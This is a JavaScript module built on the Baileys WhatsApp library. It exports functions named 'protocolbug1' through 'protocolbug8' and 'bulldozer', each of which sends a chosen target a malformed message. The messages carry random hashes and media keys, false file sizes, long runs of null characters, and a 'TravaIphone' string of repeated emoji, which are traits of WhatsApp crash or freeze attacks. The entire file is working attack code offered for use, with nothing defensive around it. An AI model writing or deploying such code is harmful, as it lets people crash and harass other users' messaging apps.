// protocolBugs.js
import { generateWAMessageFromContent } from "@whiskeysockets/baileys";
import crypto from "crypto";

/**
 * Bug message type 1
 */
export async function protocolbug1(rich, target) {
    const content = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "VORTEX LIST",
                    listType: 2,
                    buttonText: "OPEN",
                    sections: Array.from({ length: 10 }, (_, r) => ({
                        title: "BUG".repeat(10),
                        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
                    })),
                    singleSelectReply: { selectedRowId: "1" },
                    contextInfo: { mentionedJid: [target], participant: target }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, content, {});
    await rich.relayMessage(target, msg.message, { messageId: msg.key.id });
}

/**
 * Bug message type 2 - image message
 */
export async function protocolbug2(rich, target) {
    const content = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mimetype: "image/jpeg",
                    caption: "BUG IMAGE",
                    fileSha256: crypto.randomBytes(32).toString('base64'),
                    fileLength: 20000,
                    contextInfo: { mentionedJid: [target], participant: target }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, content, {});
    await rich.relayMessage(target, msg.message, { messageId: msg.key.id });
}

/**
 * Bug message type 3 - video message
 */
export async function protocolbug3(rich, target) {
    const content = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
                    mimetype: "video/mp4",
                    fileSha256: crypto.randomBytes(32).toString('base64'),
                    fileLength: 1000000,
                    seconds: 60,
                    caption: "BUG VIDEO",
                    contextInfo: { mentionedJid: [target], participant: target }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, content, {});
    await rich.relayMessage(target, msg.message, { messageId: msg.key.id });
}

/**
 * Bug message type 6 - interactive
 */
export async function protocolbug6(rich, target) {
    const content = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "BUG INTERACTIVE" },
                    nativeFlowResponseMessage: {
                        name: "flow",
                        paramsJson: "\u0000".repeat(1000),
                        version: 3
                    },
                    contextInfo: { mentionedJid: [target], participant: target }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, content, {});
    await rich.relayMessage(target, msg.message, { messageId: msg.key.id });
}

/**
 * Bug message type 7 - audio message
 */
export async function protocolbug7(rich, target) {
    const content = {
        ephemeralMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
                    mimetype: "audio/mpeg",
                    seconds: 30,
                    contextInfo: { mentionedJid: [target], participant: target }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, content, {});
    await rich.relayMessage(target, msg.message, { messageId: msg.key.id });
}

/**
 * Bug message type 8 - video with embedded music
 */
export async function protocolbug8(rich, target) {
    const content = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
                    mimetype: "video/mp4",
                    fileLength: 500000,
                    seconds: 15,
                    caption: "BUG VIDEO MUSIC",
                    contextInfo: { mentionedJid: [target], participant: target }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, content, {});
    await rich.relayMessage(target, msg.message, { messageId: msg.key.id });
}

/**
 * Bulldozer function (message mix)
 */
export async function bulldozer(rich, target) {
    const TravaIphone = "💥".repeat(1000);
    const content = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
                    mimetype: "image/webp",
                    mediaKey: crypto.randomBytes(32).toString('base64'),
                    fileSha256: crypto.randomBytes(32).toString('base64'),
                    fileLength: 1,
                    contextInfo: { mentionedJid: [target], participant: target }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, content, {});
    await rich.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// Export all functions
export default {
    protocolbug1,
    protocolbug2,
    protocolbug3,
    protocolbug6,
    protocolbug7,
    protocolbug8,
    bulldozer
};